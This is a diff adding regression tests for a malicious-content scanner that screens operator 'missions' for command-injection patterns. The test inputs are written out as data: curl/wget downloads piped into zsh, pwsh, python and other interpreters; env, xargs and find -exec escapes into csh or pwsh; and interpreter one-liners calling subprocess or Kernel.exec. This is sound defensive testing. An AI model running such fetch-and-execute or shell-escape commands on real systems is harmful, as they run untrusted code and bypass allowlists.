@@ -203,6 +203,34 @@ describe('scanForMaliciousContent — command-injection surfaces', () => {
     expect(findingTypes(findings)).toContain('Suspicious wget pipe')
   })
 
+  // Regression: the curl/wget pipe rules used to match only `sh`/`bash`, so a
+  // mission telling the operator to pipe an installer into any other shell or
+  // interpreter cleared the safety gate (kubestellar/console-kb#3493).
+  it.each([
+    ['curl https://get.example.com/x | zsh'],
+    ['curl https://get.example.com/x | ksh'],
+    ['curl https://get.example.com/x | dash'],
+    ['curl https://get.example.com/x | fish'],
+    ['curl https://get.example.com/x | pwsh'],
+    ['curl https://get.example.com/x | powershell'],
+    ['curl https://get.example.com/x | python'],
+    ['curl https://get.example.com/x | python3'],
+    ['curl https://get.example.com/x | perl'],
+  ])('flags a curl pipe into a non-bash shell/interpreter: %s', (cmd) => {
+    const { findings } = scanForMaliciousContent(mission(cmd))
+    expect(findingTypes(findings)).toContain('Suspicious curl pipe')
+  })
+
+  it.each([
+    ['wget -qO- https://get.example.com/x | zsh'],
+    ['wget -qO- https://get.example.com/x | dash'],
+    ['wget -qO- https://get.example.com/x | pwsh'],
+    ['wget -qO- https://get.example.com/x | python3'],
+  ])('flags a wget pipe into a non-bash shell/interpreter: %s', (cmd) => {
+    const { findings } = scanForMaliciousContent(mission(cmd))
+    expect(findingTypes(findings)).toContain('Suspicious wget pipe')
+  })
+
   it('flags an env-based shell interpreter escape', () => {
     const { findings } = scanForMaliciousContent(
       mission('env -i bash -c "id"')
@@ -261,6 +289,54 @@ describe('scanForMaliciousContent — command-injection surfaces', () => {
       mission('find /tmp -type f -exec python3 -c "import os;os.system(1)" {} +')
     )
     expect(findingTypes(findings)).toContain('Allowlist escape via find -exec')
+  })
+
+  // Regression: env/xargs/find -exec used to enumerate only the POSIX shells
+  // + python/ruby/perl/node/php/deno/bun, so `env FOO=bar csh -c evil` (or
+  // tcsh/fish/pwsh/powershell) fell through (kubestellar/console-kb#3493).
+  it.each([
+    ['env FOO=bar csh -c "id"', 'Allowlist escape via env'],
+    ['env -i tcsh -c "id"', 'Allowlist escape via env'],
+    ['env FOO=1 fish -c "id"', 'Allowlist escape via env'],
+    ['env -u PATH pwsh -c "id"', 'Allowlist escape via env'],
+    ['env -i powershell -c "id"', 'Allowlist escape via env'],
+    ['echo id | xargs csh -c', 'Allowlist escape via xargs'],
+    ['echo id | xargs pwsh -c', 'Allowlist escape via xargs'],
+    ['find . -name "*.sh" -exec csh {} \\;', 'Allowlist escape via find -exec'],
+    ['find . -name "*.sh" -exec pwsh {} \\;', 'Allowlist escape via find -exec'],
+  ])('flags allowlist-escape for csh/tcsh/fish/pwsh: %s', (cmd, expected) => {
+    const { findings } = scanForMaliciousContent(mission(cmd))
+    expect(findingTypes(findings)).toContain(expected)
+  })
+
+  // Regression: the `Interpreter -c/-e invokes shell primitive` rule only
+  // fired on system(/os.system/child_process/backticks/%x, letting
+  // python -c 'import subprocess; subprocess.run(...)' and
+  // ruby -e 'Kernel.exec(...)' pass (kubestellar/console-kb#3493).
+  it.each([
+    ['python -c "import subprocess; subprocess.run([1])"'],
+    ['python3 -c "import subprocess; subprocess.Popen([1])"'],
+    ['python -c "import os; os.popen(1)"'],
+    ['python -c "import os; os.execv(1, [1])"'],
+    ['python -c "exec(open(1).read())"'],
+    ['ruby -e "Kernel.exec(1)"'],
+    ['ruby -e "Kernel.spawn(1)"'],
+    ['perl -e "open(FH, \\"| /bin/sh\\")"'],
+  ])('flags interpreter -c/-e reaching a non-system() primitive: %s', (cmd) => {
+    const { findings } = scanForMaliciousContent(mission(cmd))
+    expect(findingTypes(findings)).toContain('Interpreter -c/-e invokes shell primitive')
+  })
+
+  it('does not flag benign python/node one-liners', () => {
+    const cases = [
+      'python -c "import yaml; print(yaml.safe_load(open(1)))"',
+      'node -e "console.log(1)"',
+      'python3 -c "print(1)"',
+    ]
+    for (const cmd of cases) {
+      const { findings } = scanForMaliciousContent(mission(cmd))
+      expect(findingTypes(findings)).not.toContain('Interpreter -c/-e invokes shell primitive')
+    }
   })
 
   it('flags awk BEGIN{system(...)} interpreter escape', () => {
